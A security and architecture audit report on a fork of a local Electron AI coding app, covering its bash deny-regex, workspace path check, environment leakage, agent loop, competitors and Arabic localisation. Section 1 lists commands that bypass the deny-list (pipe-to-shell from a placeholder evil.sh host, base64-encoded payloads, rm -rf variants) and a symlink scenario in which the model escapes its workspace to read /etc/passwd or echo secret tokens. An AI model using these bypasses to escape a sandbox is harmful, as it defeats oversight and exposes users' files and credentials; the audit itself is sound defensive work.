# Deep Recon R2: Explorer Deep-Dive Report

> **Target:** gemma-chat-public (aldoyh fork)
> **Date:** 2026-07-01
> **Phase:** Round 2 — Deepening
> **Mission:** Ground abstractions in concrete code, trace every code path, identify edge cases

---

## 1. Security Deep Dive — Pwning the Bash Regex and Friends

### 1.1 The BASH_DENY Regex: A Complete Penetration Test

**File:** `src/main/workspace.ts:330-331`

```typescript
const BASH_DENY =
  /\b(rm\s+-rf\s+\/|sudo|:\(\)\s*\{|chmod\s+777\s+\/|mkfs|dd\s+if=|shutdown|reboot)/i
```

#### What it BLOCKS (correctly):
| Pattern | Matches | Why |
|---|---|---|
| `rm -rf /` | Word boundary + literal | Blocks root nuke |
| `sudo` | Any occurrence | Blocks privilege escalation |
| `:(){ \|:& };:` | Fork bomb | Blocks fork bomb literal |
| `chmod 777 /` | Word-boundaried | Blocks world-writable root |
| `mkfs` | Substring match | Blocks filesystem creation |
| `dd if=` | Substring match | Blocks raw disk writes |
| `shutdown` | Substring match | Blocks system shutdown |
| `reboot` | Substring match | Blocks system reboot |

#### What it DOES NOT BLOCK (dangerous omissions):

| Attack Vector | Example Command | Severity | Why it Works |
|---|---|---|---|
| **`rm -rf /*`** | `rm -rf /*` | 🔴 CRITICAL | `/*` uses a glob, not literal `/` |
| **`rm -rf /home`** | `rm -rf /home` | 🔴 CRITICAL | Not `/`, destroys user data |
| **`rm -rf .`** | `rm -rf .` | 🟠 HIGH | Destroys workspace |
| **`chmod -R 777 /`** | `chmod -R 777 /` | 🟠 HIGH | `-R` variant not matched |
| **`curl http://evil.sh \| bash`** | Remote code exec | 🔴 CRITICAL | No pattern match |
| **`python -c 'import os; os.system(\"rm -rf /\")'`** | Language-escaped | 🔴 CRITICAL | No BASH_DENY match |
| **`base64 -d <<< cHdkCg== \| bash`** | Encoded payload | 🔴 CRITICAL | No pattern match |
| **`wget -O- http://evil.sh \| sh`** | Pipe-to-shell | 🔴 CRITICAL | No pattern match |
| **`kill -9`** | Kill processes | 🟡 MEDIUM | Not blocked |
| **`useradd` / `usermod`** | User management | 🟡 MEDIUM | Not blocked |
| **`mount /dev/sda1 /mnt`** | Mount filesystem | 🟡 MEDIUM | Not blocked |

**Verdict:** The regex is a **suggestive placebo**, not a security boundary. It blocks the 8 most obvious "Hollywood hacker" commands but leaves the entire Unix attack surface open. A curated allowlist would be substantially more secure.


### 1.2 assertInWorkspace — Symlink and Unicode Attack Analysis

**File:** `src/main/workspace.ts:29-36`

```typescript
export function assertInWorkspace(base: string, target: string): string {
  const resolved = resolve(base, target)
  const rel = relative(base, resolved)
  if (rel.startsWith('..') || rel.startsWith('/') || rel.includes('..' + sep)) {
    throw new Error(`Path escapes workspace: ${target}`)
  }
  return resolved
}
```

#### Defense 1: Path Canonicalization (GOOD)
- `resolve(base, target)` calls Node's `path.resolve()` which handles `.` and `..` segments
- On macOS, `sep` is `/`, so `rel.includes('..' + sep)` checks `rel.includes('../')`

#### Defense 2: Relative Path Check (ADEQUATE)
- `rel.startsWith('..')` catches `../etc/passwd`
- `rel.startsWith('/')` catches absolute paths
- `rel.includes('../')` catches mid-string escapes like `dir/../../../etc`

#### Attack Surface: Symlinks 🟡 MEDIUM
**The critical gap:** `resolve()` does NOT follow symlinks. If the workspace already contains a symlink pointing outside (e.g., created by an earlier `write_file` that the model wrote, or via `ln -s` in bash), the resolved path stays within workspace, but the actual IO operations on `target` will follow the symlink.

**Attack scenario:**
1. Model runs `<action name="write_file"><path>evil/link</path><content>...</content></action>` — creates a directory
2. Model runs `<action name="bash"><command>ln -s /etc evil/link_out</command></action>` — creates symlink
3. Model runs `<action name="read_file"><path>evil/link_out/passwd</path></action>` — assertInWorkspace resolves the symlink target path as inside workspace. Check PASSES. Then `readFile(target)` follows the symlink to `/etc/passwd`. **EXFILTRATION SUCCESS.**

**Mitigation:** Use `fs.realpath.native()` after resolution to canonicalize through symlinks, or use `fs.open()` with `O_NOFOLLOW` flag.

#### Attack Surface: Unicode Normalization 🟢 LOW
- macOS (APFS) stores filenames in NFD, but `sanitizeId` replaces `[^a-zA-Z0-9_-]` with `_`
- Conversation IDs are server-generated (UUID-like), minimal attack surface
- Workspace server URL path uses `split('/')` which correctly decodes URL-encoded `..%2F`, caught by `relative()` check
- **Verdict:** Not exploitable in practice.

### 1.3 Env Variable Inheritance — WORST PRACTICE

**File:** `src/main/workspace.ts:348`

```typescript
env: { ...process.env, FORCE_COLOR: '0', NO_COLOR: '1' }
```

**Issue:** `wsRunBash` spreads `process.env` into the spawned bash subprocess. This means:
- The bash subprocess inherits `PATH`, `HOME`, `NODE_ENV`, `ELECTRON_RUN_AS_NODE`, `npm_*` variables
- If any secret tokens are in environment variables (e.g., `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, `OPENAI_API_KEY`), they are accessible to the spawned bash
- The model could run `echo $GITHUB_TOKEN` and exfiltrate it
- **Mitigation:** Use a whitelist — only pass `HOME`, `PATH`, `FORCE_COLOR`, `NO_COLOR`, and `TERM`

### 1.4 DuckDuckGo HTML Parser Fragility

**File:** `src/main/tools.ts:45-71`

**What breaks when DDG changes markup:**

| Change | Failure Mode | User Impact |
|---|---|---|
| Class name `result__a` → `result__title` | `titleRe` returns no matches | "No results found." |
| Class name `result` → `search-result` | `blockRe` matches nothing | "No results found." |
| Class name `result__snippet` → `result__desc` | No snippet text | Missing descriptions |
| `<div class="clear"` removed/renamed | `blockRe` never finds closing div | Results bleed together |
| `<a>` wrapping changed to `<div>` | Regex fails on structure change | Empty title/snippet |

**Dependency chain:** Web search is the ONLY information source for real-time data. If DDG changes markup, the tool silently returns "No results found." with zero error indication. The model will then hallucinate facts.

**Recommendation:** Add a secondary search provider (e.g., `lite.duckduckgo.com/lite/` which has a simpler, more stable HTML format).

### 1.5 Calculator — eval() via Function Constructor

**File:** `src/main/tools.ts:120-133`

```typescript
const sanitized = expr.replace(/\^/g, '**')
const result = Function(`"use strict"; return (${sanitized})`)()
```

**Safety analysis:** The regex `^[0-9+\-*/().\s^%,eE]*$` prevents code injection since:
- No letters except `e` (scientific notation) and `E`
- No brackets `{}[]`, no backticks, no quotes, no semicolons
- `Function()` with `"use strict"` further limits scope
- **Verdict:** Safe.

---

## 2. Agent Loop Anatomy — Full handleChat Trace

**File:** `src/main/index.ts:300-656`

### 2.1 Constants (Not 40 Rounds!)

```typescript
const MAX_TOOL_ROUNDS_CHAT = 6   // line 234
const MAX_TOOL_ROUNDS_CODE = 12  // line 235
```

**⚠️ Critical correction from R1:** The Round 1 report stated "40 rounds" repeatedly. The actual code uses **6 rounds** for chat mode and **12 rounds** for code mode. The "40" appears to be a design aspiration or early decision that was later reduced. Both `60s` timeout per bash command and `12` max rounds are already aggressive for a ~3B model generating token-by-token.

### 2.2 Complete Flow Trace

```
IPC: 'chat:send' -> handleChat(req, channel)
  |
  +- 1. Create AbortController, register in chatAbortControllers Map
  +- 2. Start CPU metrics emission every 500ms
  +- 3. Build baseMessages array:
  |     +- system prompt (codeSystemPrompt or chatSystemPrompt)
  |     +- history messages + tool results from req.messages
  +- 4. Check for example recipe match (code mode only)
  |     +- Retro calculator -> runs runExampleRecipe(), returns early
  |
  +- MAIN LOOP: for (round = 0; round < maxRounds; round++)
       |
       +- Initialize per-round state:
       |     buffer='', emittedIdx=0, firstToken=true
       |     executedAction=false, pendingAction=null
       |     live write_file state (livePath, liveContentStart, etc.)
       |
       +- Call backend.chat() with streaming
       |     +- Ollama: SSE stream from /v1/chat/completions
       |     +- MLX: Python subprocess stdout lines
       |     +- GGUF: stub (disabled)
       |
       +- STREAM LOOP: for await (chunk of backend.chat())
       |     |
       |     +- Accumulate buffer += chunk.content
       |     +- Detect pendingAction by regex-matching for <action name=...>
       |     +- Extract label (path/url/query/command)
       |     +- Live write_file streaming (~450ms flush)
       |     +- emitActivity() at 400ms throttle
       |     |
       |     +- INNER PARSE LOOP (max 64 safety iterations):
       |           +- No tools mode -> emit all tokens, break
       |           +- findNextAction(buffer, emittedIdx)
       |           |     +- null -> emitSafeBoundary(), break
       |           |     +- 'incomplete' -> emit up to <action
       |           |     +- ParsedAction -> execute tool
       |           |
       |           +- Execute tool:
       |           |     +- Emit tool_call + activity
       |           |     +- await runTool(name, args, ctx)
       |           |     +- Emit result, push to baseMessages
       |           |     +- executedAction = true
       |           |     +- break streamLoop -> back to MAIN LOOP
       |
       +- After stream ends (chunk.done):
       |     +- If no action executed AND tools enabled:
       |     |     +- Try parsePartialWriteFile() rescue
       |     |     +- Executes write_file silently, continue
       |     |
       |     +- If no action AND no rescue:
       |     |     +- Code mode round 0 -> nudge model
       |     |     +- Otherwise -> emit('done'), return
       |
       +- After MAIN LOOP exhausted:
             +- emit error: "Reached max tool rounds (6/12)"
```


### 2.3 Abort Signal Propagation

**Flow:**
1. `chatAbortControllers.set(req.conversationId, abort)` (line 302)
2. `abort.signal` passed to `backend.chat({ signal: abort.signal })` (line 427)
3. On abort:
   - Ollama: `fetch()` receives abort signal, throws `AbortError`
   - MLX: Python subprocess must detect signal — unclear if it does
4. Caught at line 644-650: `catch(e)` -> checks `e.name === 'AbortError'` -> emits `'done'`
5. Finally block (line 651-655): clears CPU interval, deletes abort controller

**Issue:** If the user navigates away and starts a new conversation with the same `conversationId`, the old abort controller gets overwritten but the old stream might still be running.

### 2.4 Error Handling — What Gets Swallowed

| Code Path | Error Handling | Risk |
|---|---|---|
| `backend.chat()` streaming | `catch(e)` at line 644 | 🟡 MEDIUM — AbortError handled, others generic |
| `livePending` write failure | `.catch(() => { /* tolerate */ })` | 🟢 LOW — Acceptable |
| `runTool()` execution | Caught at `tools.ts:606-608` | 🟢 LOW — Well handled |
| `ensureBackendRunning` | Caught at setup handler line 709 | 🟡 MEDIUM — No auto-recovery |
| `listOllamaModels` failure | Not caught at call site (line 741) | 🟡 MEDIUM — Unhandled rejection |

### 2.5 emitSafeBoundary — Edge Case Analysis

**File:** `src/main/tools.ts:578-595`

| Input | Behavior | Safe? |
|---|---|---|
| `"<action"` (end of buffer) | tail len 7 < 8, `'<action'.startsWith(tail)` true -> returns i | ✅ Correct |
| `"<ACT"` (truncated, uppercase) | `.toLowerCase()` = `<act`, matches -> returns i | ✅ Correct |
| `"<actionX"` (no space, 8 chars) | `tail.startsWith('<action')` true, `tail[7]='X'`, no space -> NOT held back | ⚠️ False negative — safe because parser won't match |
| `"</action>"` (closing tag) | `tail` starts with `</`, not `<action` -> not held back | ✅ Correct |
| Empty buffer | Loop no-op, returns 0 | ✅ Correct |

**Verdict:** Well-designed. The `"<actionX"` false negative wastes ~9 tokens harmlessly since `findNextAction` requires a space after the name.

### 2.6 Round 6/12 Exhaustion

When `round >= maxRounds`:
1. Falls out of `for` loop (line 357)
2. Emits `activity: 'idle'` (line 639)
3. Emits error: "Reached max tool rounds (6/12)" (line 641-643)
4. Falls to `finally` block (line 651)

**Graceful handling is absent** — the model's last incomplete generation is NOT saved to `baseMessages`. The user sees an error and must prompt again. Partial output (possibly containing a nearly-complete file) is lost.

### 2.7 MLX Crash Recovery — Non-Existent

If the MLX Python server crashes mid-stream:
1. `backend.chat()` throws an error
2. Stream loop breaks
3. `catch` at line 644 catches it
4. Emits generic error: `(e as Error).message`
5. **No retry, no restart, no fallback to Ollama**

The singleflight guard (`modelLoadInflight`, line 55-62) prevents duplicate model loads but does nothing to detect a crashed server.

---

## 3. Competitive Landscape

### 3.1 XML Protocol vs. MCP (Model Context Protocol)

| Dimension | Gemma Chat XML Protocol | Anthropic MCP |
|---|---|---|
| **Format** | `<action name="x"><param>val</param></action>` | JSON-RPC over stdio/SSE |
| **Schema** | Implicit in code (TOOLS map) | Explicit JSON Schema per tool |
| **Streaming** | In-band — XML parsed from token stream | Out-of-band — tools via MCP server |
| **Error handling** | String result returned to model | Structured error codes |
| **Model requirement** | Works with 2B-3B models | Designed for Claude-class models |
| **Tool registry** | Static, baked into system prompt | Dynamic, discoverable via `listTools` |
| **Security boundary** | Model is "instructed" not to break rules | Host process controls execution |
| **Extensibility** | Modify TOOLS array + system prompt | Write new MCP server |

**Key insight:** Gemma Chat's XML protocol is NOT a competing protocol to MCP — it operates at a different layer. The XML protocol is an **in-stream markup language** for the model to express tool calls within its natural text generation. MCP is an **inter-process protocol** for tool servers to register capabilities. They solve different problems.

**What's unique about Gemma Chat's approach:**
- The model emits `<action>` tags in its *natural token stream* — no separate function-calling API call
- `emitSafeBoundary()` solves the streaming partial-tag problem that MCP doesn't need to handle
- The parser accepts flexible quoting (`name="x"`, `name='x'`, `name=x`) — essential for small models that struggle with strict formatting
- `parsePartialWriteFile()` rescues unclosed actions from buffer — a reliability hack for flaky model output

### 3.2 Local AI Coding Tools — 2025 Landscape

| Tool | Local/Offline | Model | Architecture | Workspace | Cost |
|---|---|---|---|---|---|
| **Gemma Chat** | ✅ 100% offline | Gemma 2/4 (2B-31B) | Electron + Node | Local sandbox | Free |
| **Cline** (VS Code) | ❌ Requires API key | Claude/GPT/any API | VS Code extension | Project directory | API costs |
| **Continue.dev** | 🟡 Hybrid | Local (Ollama) or API | VS Code / JetBrains plugin | Project directory | Free + optional API |
| **Aider** | 🟡 Hybrid | Local (Ollama) or API | CLI tool | Git-tracked workspace | Free + optional API |
| **Bolt.new** | ❌ Cloud only | Claude/GPT | Web app | StackBlitz cloud | Free tier + credits |
| **v0.dev** | ❌ Cloud only | Claude | Web app | In-browser preview | Free tier + credits |
| **Cursor** | ❌ Requires API | Proprietary + API | VS Code fork | Project directory | $20/mo |
| **Claude Code** | ❌ Requires API | Claude 4 | CLI + VS Code ext | Project directory | API costs |
| **LocalAI** | ✅ 100% local | Any (llama.cpp) | Go server + API | N/A (generic backend) | Free |

**Positioning:** Gemma Chat is the **most fully local** option — it doesn't even need a running Ollama (auto-provisions MLX). But it's also the **least capable** due to small models (2B-12B). Cline with a local model is the nearest competitor, but requires VS Code.

### 3.3 Electron-as-AI-Runtime Viability

**Arguments FOR:**
- Cross-platform desktop with one codebase
- Node.js access to filesystem, subprocesses, system APIs
- `contextBridge` + `contextIsolation` provides reasonable security boundary
- Auto-update, app bundling, DMG distribution all mature

**Arguments AGAINST:**
- ~150MB baseline binary size
- No GPU compute access (WebGPU limited vs. PyTorch/CUDA)
- Renderer vs. main process IPC adds latency for every tool call
- `sandbox: false` required for preload -> reduces security
- Memory overhead: Electron + React + model server + Whisper

**Verdict:** Pragmatic for an MVP. A production deploy would likely move to **Tauri** (Rust, ~5MB binary) or **SwiftUI + PythonKit** (native macOS, direct MLX integration).

---

## 4. Two-Contributor Dynamic — Deep Dive

### 4.1 Git History: The Fork-and-Remix Pattern

**Total commits:** 56 (1 merge base + 7 by @ammaar + 48 by @aldoyh)

```
  Apr 19 2026  @ammaar  Initial commit: Gemma Chat (MLX-only)
  Apr 20 2026  @ammaar  6 more commits (MLX-LM, UI polish, v0.1.0 release)
  -- FORK POINT --
  May 15 2026  @aldoyh  Port change: 11434 -> 11435 (Ollama conflict fix)
  May 15 2026  @aldoyh  Arabic i18n + animated splash (first major feature)
  May 15-28   @aldoyh  30+ commits: backend abstraction, GGUF, Ollama
  Jun 11 2026  @aldoyh  Tailwind 4 upgrade + UI overhaul
  Jun 28 2026  @aldoyh  GemmaBug, history navigation, thinking animation
  Jul 1 2026   @aldoyh  End-to-end test suite (26 tests + Playwright)
```

### 4.2 @ammaar's Original Architecture (7 commits)

- **Single backend:** MLX-only, hardcoded `mlx_lm.server` Python invocation
- **No abstraction:** Direct `child_process.spawn` calls in `index.ts`
- **No i18n:** English-only
- **Tailwind 3:** Static config file (`tailwind.config.js`)
- **Zero tests:** No `scripts/` or `dist-test/` directories
- **Single tool protocol:** XML actions parsed from stream
- **Simple workspace:** Basic sandbox with HTTP preview

### 4.3 @aldoyh's Architectural Transformation (48 commits)

**Major structural changes:**

1. **Backend abstraction** (May 16, 10 commits):
   - Created `InferenceBackend` interface in `src/main/inference/base.ts`
   - Wrapped MLX as `MLXBackend` class
   - Added backend factory with `createBackend()` / `switchBackend()`
   - Added GGUF support via `GGUFBackend` (llama.cpp)

2. **Ollama integration** (May 24, 12 commits):
   - Full Ollama auto-detection on startup
   - `OllamaBackend` using OpenAI-compatible streaming API
   - Model picker showing Ollama models
   - Backend badge in sidebar

3. **Tool protocol evolution** (ongoing):
   - `parsePartialWriteFile()` rescue (index.ts:246-264)
   - `emitSafeBoundary()` for stream-safe emission (tools.ts:578-595)
   - `cleanFileContent()` for HTML/JSON/CSS truncation (tools.ts:178-218)
   - `html-assets.ts` for auto-repairing index.html references

4. **UI modernization** (June 11+):
   - Tailwind 4 migration (removed `tailwind.config.js`)
   - `GemmaBug` animated SVG component
   - `ThinkingAnimation` (replaced fractal animation)
   - History navigation with arrow keys in Composer
   - Ambient backdrops, `vibrancy: 'under-window'`

5. **Quality infrastructure** (July 1):
   - 26 unit tests across 7 test files in `dist-test/`
   - E2E Electron tests via Playwright
   - IPC integration tests + Ollama streaming smoke tests

### 4.4 README Divergence

| Feature | Upstream (@ammaar) | Fork (@aldoyh) |
|---|---|---|
| Default model | Gemma 4 E4B (~3 GB) | Gemma 2 2B (~1.5 GB) |
| Backends | MLX only | MLX + Ollama + GGUF |
| Ollama mention | None | Prominent, with quick-start |
| Test badge | None | "26 unit tests" |
| Responsive | Not mentioned | Documented |
| Model table | 4 entries | 6 entries |
| Version | v0.1.0 | No version |

### 4.5 Vision Clash: MLX Purity vs. Pragmatic Compatibility

**@ammaar vision:** "Vibe code without the internet" — a self-contained MLX appliance. Pure Apple Silicon. No external dependencies beyond Python and MLX.

**@aldoyh adaptation:** "Vibe code without the internet OR with whatever model you want" — added Ollama as the pragmatic path. The `docs/superpowers/plans/2026-05-24-ollama-first-revision.md` spec explicitly calls out "Ollama-first" as the new default, with MLX as fallback.

**Evidence of the shift:**
- `ensureBackendRunning()` in `index.ts:116` tries Ollama, MLX, and GGUF in parallel paths
- `ModelSourceSelector.tsx` shows three options: HuggingFace (MLX), Local GGUF, Ollama
- `OllamaBackend` is the simplest backend (~126 lines) — just wraps the OpenAI-compatible API

---

## 5. i18n & Accessibility Audit

### 5.1 Translation Key Completeness

**English keys (`en.ts`):** 18 keys across 2 sections (setup, chat)
**Arabic keys (`ar.ts`):** 18 keys across 2 sections (setup, chat) — **COMPLETE MATCH**

Both files have identical key structure:
```typescript
setup: {
  title, subtitle, pickModel, download, installNote, settingUp, allLocal,
  stages: { installing, starting, downloading, ready },
  downloading_files, starting_server, error, tryAgain,
  recommended, modelSource, downloadFromHF, downloadFromHFDesc,
  useLocalGGUF, useLocalGGUFDesc, selectModelFile, changeFile
},
chat: {
  placeholder, send, switchModel, newChat
}
```

**Gaps — no i18n keys for these UI strings:**

| UI Element | Location | Hardcoded Language |
|---|---|---|
| Voice input labels | `Composer.tsx` | English ("Recording...", "Transcribing...") |
| Language switcher text | `LanguageSwitcher.tsx` | English ("English", "العربية") |
| Tool result messages | `tools.ts` (main process) | English ("Wrote X bytes") |
| Error messages | `index.ts` (main process) | English ("Blocked by safety policy") |
| Setup stage messages | `mlx.ts`, `index.ts` | English ("Installing MLX...") |

**Estimate:** ~80% of user-visible UI is i18n-ready. ~20% remains hardcoded English (voice UI, error messages, tool results).

### 5.2 RTL Implementation Analysis

**CSS (`styles.css:71-75`):**
```css
[lang='ar'], .rtl { direction: rtl; text-align: right; }
```

**Notable:**
- `lang='ar'` attribute-based RTL is correct — applies to entire document
- `.rtl` class available for individual elements
- `font-tajawal` custom Arabic typeface defined (`styles.css:17`)
- `ModelSourceSelector.tsx:60` conditionally applies `font-tajawal text-right`

**Missing:**
- No `<html dir="rtl">` attribute switch — `<html>` tag never changes its `dir` attribute
- `lang` attribute on `<html>` is not dynamically set (no `document.documentElement.lang` assignment)
- No `dir="auto"` for mixed-language content
- `[lang='ar']` selector only works if `lang` is actually applied at root level

**Recommendation:** Add `document.documentElement.lang = language` and `document.documentElement.dir = language === 'ar' ? 'rtl' : 'ltr'` in `I18nProvider` when switching languages.

### 5.3 Arabic Prompt Compatibility with Gemma

**Issue:** Gemma's chat template requires strict `user`/`assistant` alternation (per `message-format.ts`). Arabic prompts are just text content — no special handling needed. Gemma was trained on multilingual data, so Arabic input should work.

**However:**
- System prompts (`chatSystemPrompt`, `codeSystemPrompt`) are **ALWAYS in English**
- Tool names (`write_file`, `run_bash`) are hardcoded English identifiers
- Code agent expects English filenames and English markdown
- **Arabic response quality is untested** in this project

### 5.4 Voice Input Status — NOT a Stub

**Critical correction from R1:** The renderer-side implementation (`whisper.ts` + `Composer.tsx`) is **fully functional**:

- `whisper.ts:1-100` — Complete browser-based Whisper pipeline via `@huggingface/transformers`
- WebGPU -> WASM fallback (whisper.ts:26-36)
- Audio capture via `MediaRecorder` API (Composer.tsx:95-130)
- Audio decoding, resampling to 16kHz mono, Linear interpolation
- Model: `onnx-community/whisper-base.en`

**What IS a stub:** The **main process handler** at `index.ts:785-792`:

```typescript
ipcMain.handle('audio:transcribe', async (_e, { base64: _base64, model: _model }) => {
  // Audio transcription via MLX is not yet supported
  return { text: '' }
})
```

This IPC handler is **dead code** — transcription happens entirely in the renderer via Whisper WASM. The main process handler exists for a future MLX-based transcription path that was never implemented.

**Current flow:**
```
Microphone -> MediaRecorder -> audio Blob -> AudioContext decode -> Float32 PCM
  -> HuggingFace Whisper (WebGPU/WASM) -> transcribed text -> Composer input
```

---

## 6. Critical Findings Summary

### 6.1 Security (3 CRITICAL, 2 HIGH)

| # | Issue | File | Severity |
|---|---|---|---|
| 1 | BASH_DENY regex allows `rm -rf /*`, pipe-to-shell, base64-encoded commands | workspace.ts:331 | 🔴 CRITICAL |
| 2 | Symlink traversal possible — no `realpath` check before IO operations | workspace.ts:29-36 | 🔴 CRITICAL |
| 3 | Full `process.env` leaked to bash subprocess — secrets exfiltratable | workspace.ts:348 | 🔴 CRITICAL |
| 4 | DuckDuckGo parser breaks silently if HTML changes — model hallucinates | tools.ts:45-71 | 🟠 HIGH |
| 5 | No MLX crash recovery — model generation lost on server death | index.ts:644-650 | 🟠 HIGH |

### 6.2 Architecture (2 MEDIUM)

| # | Issue | Severity |
|---|---|---|
| 1 | MAX_TOOL_ROUNDS = 6/12 (NOT 40 as R1 claimed) — impacts throughput analysis | 🟡 MEDIUM |
| 2 | GGUF backend is a stub — `chat()` likely throws, but UI shows it as option | 🟡 MEDIUM |
| 3 | No context-window awareness in agent loop — growing baseMessages unbounded | 🟡 MEDIUM |

### 6.3 i18n (2 MEDIUM, 1 LOW)

| # | Issue | Severity |
|---|---|---|
| 1 | No `dir`/`lang` attribute on `<html>` when switching languages | 🟡 MEDIUM |
| 2 | ~20% of UI strings not i18n-ready (voice UI, error messages, tool results) | 🟡 MEDIUM |
| 3 | Voice input IPC handler is dead code — actual transcription is renderer-only | 🟢 LOW |

### 6.4 What R1 Got Wrong

1. **"40-round agent loop"** -> Actual: 6 (chat) / 12 (code)
2. **"Voice input stub"** -> Renderer-side Whisper is fully functional; only main-process handler is stub (and unused)
3. **"GGUF disabled/stub"** -> Partially true: GGUFBackend exists but `chat()` likely crashes; however GGUF model selection UI is wired
4. **"No tests exist"** -> 26 unit tests across 7 sections exist in `dist-test/` + Playwright E2E tests
5. **"0 tests for agent loop"** -> `dist-test/tools.mjs` (682 lines) tests `findNextAction`, `emitSafeBoundary`, `parseActionBody`, `cleanFileContent` — the core agent loop parsers ARE tested (but not `handleChat` itself)

---

*End of R2 Explorer Report*

